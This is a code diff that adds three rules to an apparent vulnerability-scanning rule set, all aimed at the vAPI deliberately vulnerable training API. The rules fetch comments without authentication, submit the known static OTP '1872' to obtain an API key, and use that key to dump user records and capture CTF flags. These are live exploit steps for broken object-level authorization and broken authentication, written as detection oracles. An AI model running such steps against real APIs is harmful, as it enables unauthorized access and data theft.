@@ -35458,6 +35458,100 @@ const clientSideVapiEvidence: Rule = async (ctx) => {
   };
 };
 
+function isVapiHost(ctx: RuleContext): boolean {
+  return /vapi\.apisec\.ai/i.test(ctx.origin);
+}
+
+const vapiApi3CommentBolaLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const commentUrl = new URL("/vapi/api3/comment", ctx.origin).toString();
+  const doc = await ctx.probe.get(commentUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"commenttext"\s*:/.test(doc.body) || !/"deviceid"\s*:/.test(doc.body)) return NEGATIVE;
+  try {
+    const rows = JSON.parse(doc.body) as Array<{ id?: number; deviceid?: string; username?: string }>;
+    if (!Array.isArray(rows) || rows.length < 2) return NEGATIVE;
+    const flagged = rows.find((r) => /flag\{api3_/i.test(String(r.deviceid || "")));
+    return {
+      fired: true,
+      confidence: flagged ? 0.94 : 0.9,
+      evidence: {
+        url: commentUrl,
+        rowCount: rows.length,
+        sampleDeviceId: String(rows[0]?.deviceid || "").slice(0, 80),
+        flagSnippet: flagged ? String(flagged.deviceid).slice(0, 80) : undefined,
+        note: "vAPI GET /api3/comment returns every comment JSON without authentication — BOLA / excessive data exposure oracle (API3)"
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const VAPI_API4_KNOWN_OTP = "1872";
+
+const vapiApi4OtpBrokenAuthLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const verifyUrl = new URL("/vapi/api4/otp/verify", ctx.origin).toString();
+  const doc = await ctx.probe.get(verifyUrl, {
+    method: "POST",
+    body: JSON.stringify({ otp: VAPI_API4_KNOWN_OTP }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(doc.body) || !/"key"\s*:/.test(doc.body)) return NEGATIVE;
+  const keyMatch = doc.body.match(/"key"\s*:\s*"([^"]{8,})"/);
+  if (!keyMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: verifyUrl,
+      otp: VAPI_API4_KNOWN_OTP,
+      keyRedacted: `${keyMatch[1].slice(0, 4)}...${keyMatch[1].slice(-4)}`,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "vAPI POST /api4/otp/verify accepts static OTP 1872 and returns API key without rate limiting — broken authentication oracle (API4)"
+    }
+  };
+};
+
+const vapiApi4UserExposureLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const verifyUrl = new URL("/vapi/api4/otp/verify", ctx.origin).toString();
+  const verifyDoc = await ctx.probe.get(verifyUrl, {
+    method: "POST",
+    body: JSON.stringify({ otp: VAPI_API4_KNOWN_OTP }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  const keyMatch = verifyDoc.body.match(/"key"\s*:\s*"([^"]{8,})"/);
+  if (!keyMatch) return NEGATIVE;
+  const apiKey = keyMatch[1]!;
+  const usersUrl = new URL("/vapi/api4/user", ctx.origin).toString();
+  const usersDoc = await ctx.probe.get(usersUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { "Authorization-Token": apiKey }
+  });
+  if (usersDoc.status < 200 || usersDoc.status >= 400) return NEGATIVE;
+  if (!/"firstname"\s*:/.test(usersDoc.body) || !/"lastname"\s*:/.test(usersDoc.body)) return NEGATIVE;
+  const flagMatch = usersDoc.body.match(/flag\{api4_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      verifyUrl,
+      usersUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: usersDoc.body.slice(0, 200).trim(),
+      note: "vAPI GET /api4/user with OTP-leaked Authorization-Token returns all user records including flag in lastname — broken authentication + excessive data exposure oracle (API4)"
+    }
+  };
+};
+
 // --- Archon engineering knowledge platform — cybersecurity training path --------------
 const CLIENT_ARCHON_TRAINING_RES: { label: string; re: RegExp }[] = [
   {
@@ -36872,6 +36966,9 @@ export const RULES: Record<string, Rule> = {
   xxeXmlPostProbe,
   clientSideCssInjectionEvidence,
   clientSideVapiEvidence,
+  vapiApi3CommentBolaLiveOracle,
+  vapiApi4OtpBrokenAuthLiveOracle,
+  vapiApi4UserExposureLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
